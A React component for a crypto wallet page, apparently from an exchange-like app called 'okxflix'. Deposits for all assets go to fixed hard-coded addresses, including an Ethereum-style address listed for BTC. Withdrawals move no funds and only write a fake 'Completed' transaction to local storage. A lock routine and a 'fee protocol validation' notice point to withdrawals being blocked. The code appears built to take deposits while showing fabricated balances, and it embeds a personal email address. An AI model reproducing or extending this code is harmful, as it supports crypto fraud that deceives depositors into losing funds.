'use client';

import React, { useState } from 'react';
import { useApp } from '@/lib/store';
import { Wallet, ArrowDownLeft, ArrowUpRight, Copy, CheckCircle2, ShieldAlert, Plus, Send } from 'lucide-react';
import { TransactionRecord } from '@/types';
import { TopUpModal } from '@/components/TopUpModal';
import { SendBtcModal } from '@/components/SendBtcModal';
import { getAssetLogo } from '@/lib/logoMap';

export const WalletView: React.FC = () => {
  const { balances, setBalances, transactions, setTransactions, adminBtcAddress, triggerDeactivationLock, formatMoney, user, checkAccountActive, setIsActivationModalOpen } = useApp();
  
  const [activeModal, setActiveModal] = useState<'deposit' | 'withdraw' | null>(null);
  const [isTopUpOpen, setIsTopUpOpen] = useState<boolean>(false);
  const [isSendBtcOpen, setIsSendBtcOpen] = useState<boolean>(false);
  const [selectedAsset, setSelectedAsset] = useState<string>('BTC');
  const [withdrawAmount, setWithdrawAmount] = useState<string>('');
  const [withdrawAddress, setWithdrawAddress] = useState<string>('');
  const [copied, setCopied] = useState<boolean>(false);

  const isOwner = user.role === 'owner' || user.email === 'richardshannon901@gmail.com';

  const ASSET_DEPOSIT_ADDRESSES: Record<string, string> = {
    BTC: '0x697638fe9a9b7b98556957090c165ce55dda2fc0',
    ETH: '0x697638fe9a9b7b98556957090c165ce55dda2fc0',
    USDT: '0x697638fe9a9b7b98556957090c165ce55dda2fc0',
    SOL: '4YNt2cgg2v9bzx3a4pxDrYWsMyrPjQoyqrotsuSnNkr6',
    BNB: '0x697638fe9a9b7b98556957090c165ce55dda2fc0',
  };

  const ASSET_QR_IMAGES: Record<string, string> = {
    BTC: '/btc_qr.jpg',
    ETH: '/eth_qr.jpg',
    USDT: '/usdt_qr.jpg',
    SOL: '/sol_qr.jpg',
    BNB: '/bnb_qr.jpg',
  };

  const currentDepositAddress = ASSET_DEPOSIT_ADDRESSES[selectedAsset] || adminBtcAddress;

  const handleCopyAddress = () => {
    navigator.clipboard.writeText(currentDepositAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 3000);
  };

  const handleWithdrawSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (isOwner) {
      if (!checkAccountActive()) {
        setActiveModal(null);
        return;
      }
      triggerDeactivationLock();
    } else {
      const asset = balances.find(b => b.assetSymbol === selectedAsset);
      const amt = parseFloat(withdrawAmount);
      if (!asset || isNaN(amt) || amt <= 0) {
        alert('Please enter a valid withdrawal amount.');
        return;
      }
      if (amt > asset.available) {
        alert(`Insufficient available balance. Available: ${asset.available} ${selectedAsset}`);
        return;
      }
      if (!withdrawAddress.trim()) {
        alert('Please enter a valid destination withdrawal address.');
        return;
      }

      const updatedBalances = balances.map(b => {
        if (b.assetSymbol === selectedAsset) {
          const newAvail = b.available - amt;
          const priceRatio = b.available > 0 ? b.valueUSD / b.available : 0;
          return {
            ...b,
            available: newAvail,
            valueUSD: newAvail * priceRatio
          };
        }
        return b;
      });

      setBalances(updatedBalances);
      try {
        localStorage.setItem(`okxflix_balances_${user.id}`, JSON.stringify(updatedBalances));
      } catch (err) {
        console.error(err);
      }

      const newTx: TransactionRecord = {
        id: `TX-${Math.random().toString(36).substring(2, 8).toUpperCase()}`,
        date: new Date().toISOString().split('T')[0],
        time: new Date().toTimeString().split(' ')[0],
        timestamp: Date.now(),
        type: 'withdrawal',
        status: 'Completed',
        coin: selectedAsset,
        amount: amt,
        fiatValue: amt * (asset.valueUSD / (asset.available || 1)),
        direction: 'outflow',
        network: 'Mainnet',
        walletType: 'Cold Storage Vault',
        confirmationCount: 12,
        anonymousCounterpartyId: withdrawAddress.slice(0, 10) + '...',
        fee: 0.0005,
        reference: `Withdrawal to ${withdrawAddress}`
      };

      const updatedTxs = [newTx, ...transactions];
      setTransactions(updatedTxs);
      try {
        localStorage.setItem(`okxflix_transactions_${user.id}`, JSON.stringify(updatedTxs));
      } catch (err) {
        console.error(err);
      }

      alert(`Successfully withdrew ${amt} ${selectedAsset} to ${withdrawAddress}.`);
      setActiveModal(null);
      setWithdrawAmount('');
      setWithdrawAddress('');
    }
  };

  const handleDepositClick = (assetSymbol: string) => {
    if (!checkAccountActive()) return;
    setSelectedAsset(assetSymbol);
    setActiveModal('deposit');
  };

  const handleWithdrawClick = (assetSymbol: string) => {
    if (!checkAccountActive()) return;
    setSelectedAsset(assetSymbol);
    setActiveModal('withdraw');
  };

  return (
    <div className="space-y-6 pb-12 animate-fadeIn">
      {/* Header */}
      <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 shadow-xl flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <span className="text-xs bg-amber-500/10 text-amber-400 font-mono px-2 py-0.5 rounded-full border border-amber-500/20 font-bold uppercase">
              Account Status: {user.accountStatus}
            </span>
            <span className="text-xs text-slate-400 font-mono">UID: {user.id}</span>
          </div>
          <h1 className="text-2xl font-bold text-white tracking-tight">Multi-Asset Secure Wallet</h1>
          <p className="text-xs text-slate-400 mt-1">Manage institutional deposit vaults, cold storage reserves, and portfolio balances.</p>
        </div>
        <div className="flex items-center gap-3 flex-wrap">
          <button
            onClick={() => {
              if (!checkAccountActive()) return;
              setIsTopUpOpen(true);
            }}
            className="bg-emerald-600 hover:bg-emerald-500 text-white px-4 py-2.5 rounded-xl text-xs font-semibold shadow-lg shadow-emerald-600/30 flex items-center gap-2"
          >
            <Plus className="w-4 h-4" />
            <span>Top Up</span>
          </button>
          <button
            onClick={() => {
              if (!checkAccountActive()) return;
              setIsSendBtcOpen(true);
            }}
            className="bg-amber-600 hover:bg-amber-500 text-white px-4 py-2.5 rounded-xl text-xs font-semibold shadow-lg shadow-amber-600/30 flex items-center gap-2"
          >
            <Send className="w-4 h-4" />
            <span>Send BTC</span>
          </button>
          <button
            onClick={() => {
              if (!checkAccountActive()) return;
              setActiveModal('deposit');
            }}
            className="bg-slate-800 hover:bg-slate-700 text-slate-200 px-4 py-2.5 rounded-xl text-xs font-semibold flex items-center gap-2"
          >
            <ArrowDownLeft className="w-4 h-4" />
            <span>Deposit</span>
          </button>
          <button
            onClick={() => {
              if (!checkAccountActive()) return;
              setActiveModal('withdraw');
            }}
            className="bg-slate-800 hover:bg-slate-700 text-slate-200 px-4 py-2.5 rounded-xl text-xs font-semibold flex items-center gap-2"
          >
            <ArrowUpRight className="w-4 h-4" />
            <span>Withdraw</span>
          </button>
        </div>
      </div>

      {isTopUpOpen && <TopUpModal onClose={() => setIsTopUpOpen(false)} />}
      {isSendBtcOpen && <SendBtcModal onClose={() => setIsSendBtcOpen(false)} />}

      {/* Asset Balances Grid */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
        {balances.map(b => (
          <div key={b.assetSymbol} className="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 shadow-xl flex flex-col justify-between">
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 rounded-full border-2 border-blue-500 bg-slate-900 flex items-center justify-center overflow-hidden shrink-0 shadow-md shadow-blue-500/20">
                  {getAssetLogo(b.assetSymbol) ? (
                    <img src={getAssetLogo(b.assetSymbol)} alt={b.assetName} className="w-7 h-7 object-contain" referrerPolicy="no-referrer" />
                  ) : (
                    <span className="text-xs font-bold text-blue-400 font-mono">{b.assetSymbol.slice(0, 3)}</span>
                  )}
                </div>
                <div>
                  <h3 className="text-sm font-bold text-white">{b.assetName}</h3>
                  <p className="text-xs text-slate-400 font-mono">{b.assetSymbol}</p>
                </div>
              </div>
              <span className="text-xs font-mono font-bold text-emerald-400">{formatMoney(b.valueUSD)}</span>
            </div>

            <div className="space-y-1.5 text-xs font-mono border-t border-slate-800 pt-3">
              <div className="flex justify-between text-slate-400">
                <span>Available:</span>
                <span className="text-white font-semibold">{user.privacyMode ? '••••••••' : `${b.available.toLocaleString()} ${b.assetSymbol}`}</span>
              </div>
              <div className="flex justify-between text-slate-400">
                <span>Locked / Margin:</span>
                <span className="text-slate-300">{user.privacyMode ? '••••••••' : `${b.locked.toLocaleString()} ${b.assetSymbol}`}</span>
              </div>
            </div>

            <div className="mt-4 flex items-center gap-2">
              <button 
                onClick={() => handleDepositClick(b.assetSymbol)}
                className="flex-1 bg-slate-800 hover:bg-slate-700 text-slate-200 py-1.5 rounded-lg text-xs font-semibold transition-colors"
              >
                Deposit
              </button>
              <button 
                onClick={() => handleWithdrawClick(b.assetSymbol)}
                className="flex-1 bg-slate-800 hover:bg-slate-700 text-slate-200 py-1.5 rounded-lg text-xs font-semibold transition-colors"
              >
                Withdraw
              </button>
            </div>
          </div>
        ))}
      </div>

      {/* Deposit Modal / Drawer */}
      {activeModal === 'deposit' && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-slate-800 rounded-2xl max-w-lg w-full p-6 shadow-2xl relative animate-scaleUp">
            <h3 className="text-lg font-bold text-white mb-2">Secure Deposit Vault</h3>
            <p className="text-xs text-slate-400 mb-4">Select asset and network to view institutional deposit instructions.</p>

            <div className="space-y-4">
              <div>
                <label className="block text-xs font-medium text-slate-400 mb-1">Select Asset</label>
                <select 
                  value={selectedAsset} 
                  onChange={(e) => setSelectedAsset(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white"
                >
                  {balances.map(b => (
                    <option key={b.assetSymbol} value={b.assetSymbol}>{b.assetName} ({b.assetSymbol})</option>
                  ))}
                </select>
              </div>

              <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <div>
                    <span className="text-xs font-bold text-white">{balances.find(b => b.assetSymbol === selectedAsset)?.assetName || selectedAsset}</span>
                    <span className="text-[10px] text-slate-400 font-mono ml-2">({selectedAsset}) Deposit Address</span>
                  </div>
                  <span className="text-[10px] bg-amber-500/10 text-amber-400 px-2 py-0.5 rounded font-mono">SECURE VAULT</span>
                </div>

                {/* QR Code Display */}
                <div className="flex flex-col items-center justify-center my-3 space-y-2">
                  <span className="text-xs font-bold text-white uppercase tracking-wider">
                    {balances.find(b => b.assetSymbol === selectedAsset)?.assetName || selectedAsset} ({selectedAsset}) Deposit QR Code
                  </span>
                  <div className="bg-white p-3 rounded-2xl shadow-xl border border-slate-700 flex flex-col items-center">
                    <img 
                      src={ASSET_QR_IMAGES[selectedAsset] || '/btc_qr.jpg'} 
                      alt={`${selectedAsset} Deposit QR Code`}
                      className="w-44 h-44 object-contain rounded-xl"
                      referrerPolicy="no-referrer"
                    />
                  </div>
                  <span className="text-[10px] text-slate-400 font-mono">Scan QR code with your external wallet or exchange app</span>
                </div>

                <div className="bg-slate-900 p-3 rounded-xl border border-slate-800 flex flex-col sm:flex-row sm:items-center justify-between gap-3 min-w-0">
                  <span className="text-[11px] sm:text-xs font-mono text-white break-all">{currentDepositAddress}</span>
                  <button
                    type="button"
                    onClick={handleCopyAddress}
                    className="bg-blue-600 hover:bg-blue-500 text-white px-3.5 py-2 rounded-xl text-xs font-semibold shrink-0 flex items-center justify-center gap-1.5 shadow"
                  >
                    {copied ? <CheckCircle2 className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>{copied ? 'Copied' : 'Copy Address'}</span>
                  </button>
                </div>

                <div className="bg-amber-500/10 border border-amber-500/20 p-2.5 rounded-lg text-[11px] text-amber-300">
                  <span className="font-semibold">Deposit Notice:</span> Send only {selectedAsset} to this address. Funds are credited automatically upon blockchain confirmation.
                </div>
              </div>
            </div>

            <div className="mt-6 flex justify-end gap-3">
              <button
                onClick={() => setActiveModal(null)}
                className="bg-slate-800 hover:bg-slate-700 text-slate-300 px-4 py-2 rounded-xl text-xs font-semibold"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Withdrawal / Send Modal */}
      {activeModal === 'withdraw' && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm z-50 flex items-center justify-center p-3 sm:p-4 overflow-y-auto">
          <div className="bg-slate-900 border border-slate-800 rounded-2xl max-w-lg w-full p-4 sm:p-6 shadow-2xl relative animate-scaleUp max-h-[90vh] overflow-y-auto my-auto">
            <h3 className="text-lg font-bold text-white mb-2">Institutional Withdrawal Pipeline</h3>
            <p className="text-xs text-slate-400 mb-4">Transfer simulated assets to external custody or destination address.</p>

            <form onSubmit={handleWithdrawSubmit} className="space-y-4">
              <div>
                <label className="block text-xs font-medium text-slate-400 mb-1">Asset</label>
                <select 
                  value={selectedAsset} 
                  onChange={(e) => setSelectedAsset(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white truncate"
                >
                  {balances.map(b => (
                    <option key={b.assetSymbol} value={b.assetSymbol}>{b.assetName} ({b.assetSymbol}) - Available: {b.available}</option>
                  ))}
                </select>
              </div>

              <div>
                <label className="block text-xs font-medium text-slate-400 mb-1">Destination Address</label>
                <input
                  type="text"
                  placeholder="bc1q..."
                  value={withdrawAddress}
                  onChange={(e) => setWithdrawAddress(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white font-mono break-all"
                  required
                />
              </div>

              <div>
                <label className="block text-xs font-medium text-slate-400 mb-1">Amount</label>
                <input
                  type="number"
                  step="0.001"
                  placeholder="0.00"
                  value={withdrawAmount}
                  onChange={(e) => setWithdrawAmount(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white font-mono"
                  required
                />
              </div>

              <div className="bg-amber-500/10 border border-amber-500/20 p-3 rounded-xl text-xs text-amber-300 flex items-start gap-2">
                <ShieldAlert className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
                <span>
                  Notice: Executing external withdrawals requires passing the mandatory security verification and fee protocol validation.
                </span>
              </div>

              <div className="mt-6 flex justify-end gap-3">
                <button
                  type="button"
                  onClick={() => setActiveModal(null)}
                  className="bg-slate-800 hover:bg-slate-700 text-slate-300 px-4 py-2 rounded-xl text-xs font-semibold"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="bg-blue-600 hover:bg-blue-500 text-white px-5 py-2 rounded-xl text-xs font-semibold shadow-lg shadow-blue-600/30"
                >
                  Continue Withdrawal
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};
